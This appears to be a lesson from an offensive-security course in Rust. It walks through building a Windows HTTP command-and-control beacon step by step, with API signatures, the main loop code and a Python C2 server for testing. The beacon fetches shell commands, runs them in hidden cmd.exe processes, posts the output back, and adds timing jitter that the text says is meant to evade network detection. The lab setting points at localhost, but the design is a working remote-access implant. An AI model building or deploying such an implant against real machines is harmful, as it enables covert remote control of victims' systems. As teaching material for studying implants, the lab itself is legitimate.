# Module 25 — HTTP Beacon

## Concept

A **beacon** is the smallest useful C2 (command-and-control) implant. It runs a loop:

1. Sleep (with jitter so the interval isn't perfectly regular).
2. Check in to the C2 server: `GET /cmd` → receive a shell command.
3. If there is a command, execute it with a hidden child process and capture the output.
4. Send the output back: `POST /output`.
5. Repeat.

This module implements that loop using the Windows HTTP client (WinHttp) and anonymous pipes for child-process output capture. There are no external crates — everything goes through Win32.

### Why WinHttp instead of std::net?

`std::net` would work for raw TCP, but HTTP is layered on top of TCP. Implementing HTTP from scratch is off-topic. WinHttp is the built-in Windows HTTP client — available on every target machine, zero runtime dependencies.

### Why jitter?

A beacon that checks in every 5000 ms exactly is trivially detected by network flow analysis: regular inter-request intervals are a signature. Adding ±20% random jitter breaks the periodicity so the traffic blends with normal application polling.

### Why anonymous pipes for command output?

`CreateProcessA` can redirect a child's `stdout` and `stderr` to a file, a socket, or a **pipe**. A pipe lets you read the child's output in your own process without writing anything to disk. The pattern is:

```
[beacon]─write_end──[pipe]──read_end─[beacon]
              ↑
         [cmd.exe /c ...]
```

The child writes to `write_end` (which it inherits from the beacon). The beacon reads from `read_end`. After the child exits, `ReadFile` on `read_end` returns an error/EOF, ending the collection loop.

---

## Task — Implement the beacon (`25-http-beacon/src/main.rs`)

The skeleton has `todo!()` for each function. Implement them in order.

### Step 1 — Define constants (already provided in skeleton)

```
C2_HOST  = "127.0.0.1"
C2_PORT  = 8080
SLEEP_MS = 5000
JITTER_PCT = 20
```

These are the only knobs you need to change to point the beacon at a different server.

### Step 2 — Implement `jitter_sleep(base_ms: u32, pct: u32)`

Use `GetTickCount64` as a cheap entropy source (it gives milliseconds since boot — not cryptographic, but enough to break timing regularity):

```
GetTickCount64() -> u64   // milliseconds since last boot; cheap entropy
Sleep(dwMilliseconds: u32) -> ()   // suspends current thread for the given duration
```

Algorithm:
- `max_offset = base_ms * pct / 100`
- `offset = (GetTickCount64() % (max_offset as u64 + 1)) as u32`
- Add or subtract based on whether `GetTickCount64() % 2 == 0`
- Floor the result at 0 before passing to `Sleep`

### Step 3 — Implement `http_get(host, port, path) -> Vec<u8>`

Uses five WinHttp functions. Call them in order:

```
WinHttpOpen(
    pszagentw: PCWSTR,                // user-agent string, e.g. to_wide_null("beacon/1.0")
    dwaccesstype: WINHTTP_ACCESS_TYPE, // WINHTTP_ACCESS_TYPE_DEFAULT_PROXY
    pszproxyw: PCWSTR,                // WINHTTP_NO_PROXY_NAME — pass null via PCWSTR::null()
    pszproxybypassw: PCWSTR,          // WINHTTP_NO_PROXY_BYPASS — PCWSTR::null()
    dwflags: u32,                     // 0 — synchronous / no async flags
) -> HINTERNET                        // null if failed; check with .is_invalid()
```

```
WinHttpConnect(
    hsession: HINTERNET,      // session handle from WinHttpOpen
    pswzservername: PCWSTR,   // host as a wide string, e.g. to_wide_null("127.0.0.1")
    nserverport: u16,         // port number, e.g. 8080
    dwreserved: u32,          // 0 — must be zero
) -> HINTERNET                // null on failure
```

```
WinHttpOpenRequest(
    hconnect: HINTERNET,               // connection handle
    pwszverb: PCWSTR,                  // HTTP verb: to_wide_null("GET")
    pwszobjectname: PCWSTR,            // URL path: to_wide_null("/cmd")
    pwszversion: PCWSTR,               // null — use default HTTP/1.1
    pwszreferrer: PCWSTR,              // null — WINHTTP_NO_REFERER
    ppwszaccepttypes: *const PCWSTR,   // null — WINHTTP_DEFAULT_ACCEPT_TYPES
    dwflags: u32,                      // 0 (use WINHTTP_FLAG_SECURE for HTTPS)
) -> HINTERNET                         // request handle; null on failure
```

```
WinHttpSendRequest(
    hrequest: HINTERNET,         // request handle
    lpszheaders: PCWSTR,         // null — no additional headers
    dwheaderslength: u32,        // 0
    lpoptional: *const c_void,   // null — no request body for GET
    dwoptionallength: u32,       // 0
    dwtotallength: u32,          // 0
    dwcontext: usize,            // 0 — synchronous, no context needed
) -> Result<()>
```

```
WinHttpReceiveResponse(
    hrequest: HINTERNET,      // request handle
    lpreserved: *mut c_void,  // null — reserved, always null
) -> Result<()>               // call this before reading the body
```

Read loop:

```
WinHttpQueryDataAvailable(
    hrequest: HINTERNET,                    // request handle
    lpdwnumberofbytesavailable: *mut u32,   // out: bytes ready to read; 0 means done
) -> Result<()>
```

```
WinHttpReadData(
    hrequest: HINTERNET,             // request handle
    lpbuffer: *mut c_void,           // pointer to your buffer
    dwnumberofbytestoread: u32,      // how many bytes to read (use the available count)
    lpdwnumberofbytesread: *mut u32, // out: how many were actually read this call
) -> Result<()>
```

Close all three handles when done: `WinHttpCloseHandle(h_request)`, `WinHttpCloseHandle(h_connect)`, `WinHttpCloseHandle(h_session)`.

### Step 4 — Implement `http_post(host, port, path, body: &[u8]) -> bool`

Identical to `http_get` except:
- Verb is `"POST"`
- Pass `body.as_ptr() as *const c_void` as `lpOptional` in `WinHttpSendRequest`
- Both `dwOptionalLength` and `dwTotalLength` equal `body.len() as u32`
- You don't need to read the response body — just check `WinHttpSendRequest` + `WinHttpReceiveResponse` succeed

### Step 5 — Implement `run_command(cmd: &str) -> Vec<u8>`

**Create an anonymous pipe:**

```
CreatePipe(
    hreadpipe: *mut HANDLE,                       // out: read end — you read from this
    hwritepipe: *mut HANDLE,                      // out: write end — child writes here
    lppipeattributes: *const SECURITY_ATTRIBUTES, // set bInheritHandle = TRUE so child inherits
    nsize: u32,                                   // 0 — use system default buffer size
) -> Result<()>
```

The `SECURITY_ATTRIBUTES` must have `bInheritHandle: BOOL(1)` so the child process inherits the write end:

```rust
let sa = SECURITY_ATTRIBUTES {
    nLength: mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
    lpSecurityDescriptor: std::ptr::null_mut(),
    bInheritHandle: BOOL(1),
};
```

**Configure STARTUPINFOA for output redirection:**

Set these fields before passing to `CreateProcessA`:
```rust
si.dwFlags    = STARTF_USESTDHANDLES;
si.hStdOutput = write_end;
si.hStdError  = write_end;
si.hStdInput  = HANDLE(0);
```

**Spawn the child:**

```
CreateProcessA(
    lpapplicationname: PCSTR,                          // None — resolve from command line
    lpcommandline: PSTR,                               // mutable buffer: b"cmd.exe /c <cmd>\0"
    lpprocessattributes: Option<*const SECURITY_ATTRIBUTES>, // None
    lpthreadattributes: Option<*const SECURITY_ATTRIBUTES>,  // None
    binherithandles: BOOL,                             // BOOL(1) — child must inherit the pipe
    dwcreationflags: PROCESS_CREATION_FLAGS,           // CREATE_NO_WINDOW — no visible console
    lpenvironment: Option<*const c_void>,              // None — inherit parent's environment
    lpcurrentdirectory: PCSTR,                         // None — inherit parent's directory
    lpstartupinfo: *const STARTUPINFOA,                // &si (with the redirected handles)
    lpprocessinformation: *mut PROCESS_INFORMATION,    // &mut pi — receives hProcess, hThread
) -> Result<()>
```

**Close the write end in the parent** (critical):
```rust
CloseHandle(write_end).unwrap();
```
If the parent still holds `write_end` open, `ReadFile` on `read_end` will never return EOF — the loop hangs forever.

**Read the pipe until EOF:**

```
ReadFile(
    hfile: HANDLE,                  // read_end
    lpbuffer: *mut c_void,          // pointer to a local [u8; 4096]
    nnumberofbytestoread: u32,      // 4096
    lpnumberofbytesread: *mut u32,  // out: actual bytes read this call
    lpoverlapped: *mut OVERLAPPED,  // null — synchronous read
) -> Result<()>   // returns Err when the pipe is broken (child exited) — that's your EOF signal
```

Loop until `ReadFile` returns an error or reads 0 bytes; append each chunk to your output `Vec<u8>`.

**Cleanup:** `WaitForSingleObject(pi.hProcess, INFINITE)` then `CloseHandle` everything.

### Step 6 — Main beacon loop

Wire the functions together:

```rust
loop {
    let cmd_bytes = http_get(C2_HOST, C2_PORT, "/cmd");
    let cmd_str = String::from_utf8_lossy(&cmd_bytes).trim().to_string();
    if cmd_str.is_empty() {
        jitter_sleep(SLEEP_MS, JITTER_PCT);
        continue;
    }
    let output = run_command(&cmd_str);
    http_post(C2_HOST, C2_PORT, "/output", &output);
    jitter_sleep(SLEEP_MS, JITTER_PCT);
}
```

---

## Wide string note

WinHttp APIs use UTF-16 wide strings (`PCWSTR`). The skeleton includes a helper:

```rust
fn to_wide_null(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}
```

Use it like this:

```rust
let agent = to_wide_null("beacon/1.0");
let h = WinHttpOpen(PCWSTR::from_raw(agent.as_ptr()), ...);
// `agent` must stay alive for the duration of the call
```

The `Vec<u16>` must remain in scope (not dropped) for as long as the resulting `PCWSTR` is used.

---

## Testing setup

You need a simple C2 server to test against. A minimal Python 3 server works:

```python
# c2_server.py
from http.server import BaseHTTPRequestHandler, HTTPServer

PENDING_CMD = "whoami"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/cmd":
            self.send_response(200)
            self.end_headers()
            self.wfile.write(PENDING_CMD.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        print(f"[output]\n{body.decode(errors='replace')}")
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args): pass  # silence access log

HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
```

Run `python3 c2_server.py` on the VM, then run `http-beacon.exe`. You should see the output of `whoami` printed by the server.

---

## Acceptance Criteria

- [ ] `cargo build --target x86_64-pc-windows-gnu -p http-beacon` succeeds
- [ ] Running the beacon connects to `127.0.0.1:8080` and issues a GET `/cmd`
- [ ] When the server responds with a non-empty string, the beacon runs it with `cmd.exe /c`
- [ ] The output is POSTed to `/output` and visible on the server
- [ ] The beacon sleeps between cycles; sleep duration varies by ±20% across cycles
- [ ] When the server returns an empty body, the beacon silently sleeps and retries
- [ ] All WinHttp handles are closed after each request (no handle leak per cycle)
- [ ] The pipe write end is closed in the parent before reading output (no deadlock)
- [ ] `CreateProcessA` uses `BOOL(1)` for `bInheritHandles` (otherwise the child can't write to the pipe)

---

## Hints

- `HINTERNET` has an `.is_invalid()` method — use it to check for null handles from WinHttp.
- Keep the `Vec<u16>` wide-string buffers alive in local variables — if they are dropped before the API call returns, you have a dangling pointer.
- The pipe write end must be marked inheritable (`bInheritHandle: BOOL(1)` in `SECURITY_ATTRIBUTES`) — otherwise the child gets no handle even if `bInheritHandles = TRUE` in `CreateProcessA`.
- `ReadFile` returning an error is the normal EOF signal for a pipe — don't panic on it, just break the loop.
- If you see the beacon loop but no output arrives, check that you're closing the write end in the parent (step 5). Forgetting this is the most common bug in pipe-based output capture.
- Build and run the beacon on the VM; run the Python server on the host with port forwarding, or run both on the VM.

---

## Submission

Paste `25-http-beacon/src/main.rs` and ask for a review.
